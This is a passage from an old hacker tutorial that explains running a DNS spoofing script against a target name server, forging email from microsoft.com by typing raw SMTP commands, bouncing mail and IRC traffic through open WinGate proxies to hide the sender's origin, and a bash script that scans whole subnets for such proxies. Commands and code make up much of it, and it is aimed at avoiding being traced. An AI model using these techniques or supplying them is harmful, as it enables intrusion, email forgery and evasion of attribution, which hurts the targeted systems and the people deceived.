+[root@ns root]# lynx http://www2.dataguard.no/bugtraq/1997_3/0399.html -dump > jizz.sh
+
+Then pico or emacs the jizz.sh and cut away what comes before #!/bin/sh, and 
+what comes after the last done (right before the --- end jizz.sh ---)
+
+Then you fill in the configuration data in the beginning of the jizz.sh file.
+Change these:
+
+NS=ns3.datatrax.net
+IP=1.2.3.4
+AUTH=spoof.datatrax.net
+
+To what you need them to be, then do this:
+
+[root@ns root]# chmod u+x jizz.sh
+
+After that we are ready to start, if you just execute jizz without any
+arguments it will look like this:
+
+[root@ns root]# ./jizz.sh 
+
+Intelligent DNS spoofer interface, by philbert.
+(philbert@DataTrax.Net)
+
+usage: ./jizz.sh <your ip> <spoofed domain> <irc/misc server>
+or: ./jizz.sh <your ip> <spoofed domain> -ns <NS to cache fake domain>
+
+[root@ns root]#
+
+So, here you want to first find out what IP you have, that you do (in Linux/UNIX)
+with the command `ifconfig` like this:
+
+[root@ns root]# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:10:5A:6D:C7:0E
+          inet addr:212.151.91.4  Bcast:212.151.91.255  Mask:255.255.255.0
+          UP BROADCAST NOTRAILERS RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:449484 errors:26 dropped:0 overruns:0 frame:36
+          TX packets:166849 errors:0 dropped:0 overruns:0 carrier:6
+          collisions:39 txqueuelen:100
+          Interrupt:11 Base address:0x6c00
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:3924  Metric:1
+          RX packets:348633 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:348633 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+
+[root@ns root]#
+
+This means that your IP is "212.151.91.4".
+
+And that if we resolve that:
+
+[root@ns root]# nslookup 212.151.91.4
+Server:  d212-151-231-70.swipnet.se
+Address:  127.0.0.1
+
+Name:    d212-151-231-70.swipnet.se
+Address:  212.151.91.4
+
+[root@pc140 /root]#
+
+That makes your hostname "d212-151-231-70.swipnet.se".
+
+So say now that you are going to hack 212.151.91.10 (also beeing a name server 
+in this example) and you want to spoof your IP, then you do like this:
+
+[root@ns root]# ./jizz.sh 212.151.91.10 some-other-domain.com 212.151.91.10
+trying to cache some-other-domain.com on the server itself...
+Success!, some-other-domain.com is cached on 212.151.91.10 as 212.151.91.10
+[root@ns root]#
+
+After that you can start to connect to 212.151.91.10, and it's logs
+will only show up as if that computer connected to it self.
+
+Here is a good time to remember that it's illegal to spoof.
+
+-------------------------------------------------------------------------------
+
+This is about all that needs to be said about how to operate remote exploits
+WinGates and how to spoof.
+
+So now let's move on to other techniques.
+
+===============================================================================
+3 - Other Techniques.
+===============================================================================
+
+Here in the "Other Techniques" I will explain some small tricks you can do,
+and some other stuff, since we just talked about spoofing I'll start
+with how to do mail spoofing:
+
+-------------------------------------------------------------------------------
+
+To spoof mails in a UNIX enviorment. 
+It's so easy it's sad, so here we go.
+
+-------------------------------------------------------------------------------
+
+telnet <host> 25            | connect to a host that's running sendmail
+helo <host>                 | identify with the server.
+mail from: <from@address>   | name the sender of the mail (any mail address)
+rcpt to:<to@address>        | name the receiver of the mail.
+data                        | start command for mail's body
+.                           | sends mail
+quit                        | logs you out correctly
+
+example:
+
+telnet 127.0.0.1 25
+helo microsoft.com
+mail from: root@microsoft.com
+rcpt to:root@localhost
+data
+Yes we know we cant write any programs that's stable,
+and yes, we also know that windows sucks ...
+.
+quit
+
+-------------------------------------------------------------------------------
+
+Here's what the spoofed mail headers will read if your IP is "212.151.231.70":
+
+From root@microsoft.com Fri Dec  3 00:59:00 1999
+Return-Path: <root@microsoft.com>
+Received: from microsoft.com (d212-151-231-70.swipnet.se [212.151.231.70])
+        by localhost.localdomain (8.9.3/8.9.3) with SMTP id AAA11459
+        for root@localhost; Fri, 3 Dec 1999 00:58:06 +0100
+Date: Fri, 3 Dec 1999 00:58:06 +0100
+From: root@anus.com
+Message-Id: <199912022358.AAA11459@localhost.localdomain>
+Status: RO
+
+Yes we know we cant write any programs that's stable,
+and yes, we also know that windows sucks ...
+
+-------------------------------------------------------------------------------
+
+Here I sent the mail to localhost (my own computer and made up a reseolveble
+IP for it), anyway look at the 3'd line:
+
+Received: from microsoft.com (d212-151-231-70.swipnet.se [212.151.231.70])
+
+Here it clearly says who really sent the mail, which is a bad idea if you
+don't want to get caught.
+
+Note: this should read:
+
+Received: from microsoft.com (microsoft.com [207.46.130.149])
+
+(or some IP that microsoft.com can resolve to)
+
+Get the point ? 
+
+-------------------------------------------------------------------------------
+
+So what we want to do is to bounce of a wingate to make this change:
+If we now say that the wingates IP is "202.53.247.103" the mail 
+headers will look like this:
+
+From root@microsoft.com  Fri Dec  3 01:09:50 1999
+Return-Path: <root@microsoft.com>
+Received: from microsoft.com (dial247-103.cabi.net.id [202.53.247.103])
+        by localhost.localdomain (8.9.3/8.9.3) with SMTP id BAA11612
+        for root@localhost; Fri, 3 Dec 1999 01:09:12 +0100
+Date: Fri, 3 Dec 1999 01:09:12 +0100
+From: root@microsoft.com
+Message-Id: <199912030009.BAA11612@localhost.localdomain>
+Status: RO
+
+Yes we know we cant write any programs that's stable,
+and yes, we also know that windows sucks ...
+
+-------------------------------------------------------------------------------
+Note: how to use a wingate -
+
+telnet wingate.com    (no 'wingate.com' is not a real wingate host)
+WinGate>             <<=== here you type the IP of the computer with a 
+                           sendmail daemon open, and add 25 after it.
+
+It should look something like this when you press enter:
+
+telnet wingate.com
+WinGate>212.151.231.70 25
+
+Then wait some seconds and it will display:
+Connecting to host 212.151.231.70...Connected
+220 localhost.localdomain ESMTP Sendmail 8.9.3/8.9.3; Fri, 3 Dec 1999 01:08:22 +0100
+
+And here start with the 'helo' and all the rest.
+
+-------------------------------------------------------------------------------
+
+Now the mail will only get traced to the wingate instead of your computer.
+..... this is all IF someone traces the mail at all, usually the mail
+clients doesn't show any of this info, they are simply hidden data, that
+are saved with the mail... 
+
+So someone can intact see that the mail is not authentic unless you
+spoof your IP/host with some blind-spoofing application or by doing 
+a real spoof....
+
+-------------------------------------------------------------------------------
+
+Next up I'll explain how to bounce to IRC with a WinGate so that your hostname
+will be that of the wingate.
+
+-------------------------------------------------------------------------------
+
+Start your Linux/UNIX IRC client, ircii or BitchX will do just fine.
+
+Once it's started it tries to connect to a server, let it do that,
+when it's connected and you can type, you type the following:
+
+/server some-wingate.com 23
+
+And let it connect to that, then you do the following command:
+
+/quote irc.some-ircserver.com 6667
+
+Here it might say something about ping and msg register, then you can do
+like this:
+
+/sping
+
+And:
+
+/msg <your nick> foo
+
+Then it should connect as normal, if the network allows WinGates, UnderNet 
+doesn't allow any proxy connections as far as I know.
+
+A note is that:
+
+some-wingate.com
+irc.some-ircserver.com
+
+Are faked servers. find a real wingate to replace "some-wingate.com" with, and
+a real IRC server to replace "irc.some-ircserver.com" with.
+
+-------------------------------------------------------------------------------
+
+By now you just got to be asking your self, how on earth do I find a WinGate ?
+Most wingate scanners Iv tried works very porley. So I wrote a small one
+that follows here:
+
+-------------------------------------------------------------------------------
+
+#!/bin/bash
+echo > .log.tmp.$$
+echo > .log2.tmp.$$
+echo "sleep 7" > wg.config
+echo "killall -2 telnet" >> wg.config
+
+scan="$1"
+count="0"
+max="255"
+
+clear
+
+if whoami | grep root >> /dev/null ; then
+   echo "please use this as user and not root, since it would kill all users" 
+   echo "telnet sessions"
+ else
+clear
+fi
+
+if [ "$1" = "" ]; then
+ 	echo " usage is: $0 <C host> "
+ 	echo " examples:"
+	echo " $0 127.0.0"
+ 	echo " That will scan from 127.0.0.0 to 127.0.0.255"
+ 	echo 
+ 	echo "Be aware though, while it scan ns it also kills any other telnet"
+ 	echo "sessions you might have ...."
+ exit 0
+fi
+
+while [ $count != $max ]; do count=`expr $count + 1` 
+ 	echo "Attempting connection to $1.$count "
+	echo > .log2.tmp
+	./wg.config &
+	telnet $scan.$count >> .log.tmp 
+	cat .log.tmp | grep -v refused | grep -v closed | grep -v Connected | grep -v Escape | grep -v login >> .log2.tmp
+ 	echo " " >> .log.tmp
+    done
+  echo "Done !"
+rm -f .log.tmp.$$ .log2.tmp.$$ wg.config
+exit 0
+
+-------------------------------------------------------------------------------
+
+To make it work just cut away what comes before "#!/bin/bash", and what comes
+after "exit 0" ... or you might want to cut'n'paste it to a new file, call it
+"wg-scan" or something like that.
+
+Then do:
+
+[user@localhost user]$ chmod a+x wg-scan
+[user@localhost user]$ ./wg-scan
+
+Here it clears your screen and says:
+
+ usage is: ./wg-scan <C host>
+ examples:
+ ./wg-scan 127.0.0
+ That will scan from 127.0.0.0 to 127.0.0.255
+
+be aware though, while it scans it also kills any other telnet
+sessions you might have .... yeah I'm working on it ...
+
+
+And so you do just that, you think of a C class subnet and you scan it.
+
+Also know that it may take ALOT of time to scan after a WinGate.
+
+-------------------------------------------------------------------------------
+
+And that's about it !
+
+===============================================================================
+-------------------------------------------------------------------------------
+===============================================================================
+
+Now that you know how to operate these programs, even if you were go around and
+hack 100 computers, you are still NOT a real hacker.
+You would still be just a lame script kiddie, to be a real hacker takes ALOT
+of time and ALOT of determination.
+
+Say now, if you learn UNIX on administration level, then you learn bash (UNIX
+shell scripting language) really well, and after that you learn C programming
+well, and asm (assambley language).
+
+And after that start to find and make your own exploits and find exploitable
+bugs in programs and so, THEN you can start to call yourself a hacker.
+
+You are not a hacker just because you can execute an exploit or a program
+that someone else have programmed, that is just as stupid as if you called
+yourself a webmaster just cause you know how to start Internet Explorer or
+Netscape .... Or trying to call yourself a programmer just because you
+can compile a program....
+It says it self, it just doesn't work that way.
+
+So now let's all find some good music by Prodigy and let's hack the planet...
+
+ummmm, like NOT :P
+
+===============================================================================
+---------------------------Written by Evil_Plague------------------------------
+===============================================================================
